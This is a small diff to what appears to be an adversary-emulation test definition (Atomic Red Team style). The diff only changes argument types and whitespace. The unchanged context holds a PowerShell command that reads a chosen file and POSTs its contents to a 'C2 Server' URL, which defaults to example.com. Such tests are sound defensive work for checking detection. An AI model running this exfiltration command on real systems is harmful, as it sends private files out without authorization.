@@ -10,13 +10,12 @@ atomic_tests:
   input_arguments:
     destination_url:
       description: Destination URL to post encoded data.
-      type: string
+      type: String
       default: example.com
     filepath:
       description: The file which is being exfiltrated to the C2 Server.
-      type: string
+      type: Path
       default: C:\Users\$env:UserName\LineNumbers.txt
-
   dependency_executor_name: powershell
   dependencies:
   - description: |
@@ -32,4 +31,3 @@ atomic_tests:
       $filecontent = Get-Content -Path #{filepath}
       Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
     name: powershell
-
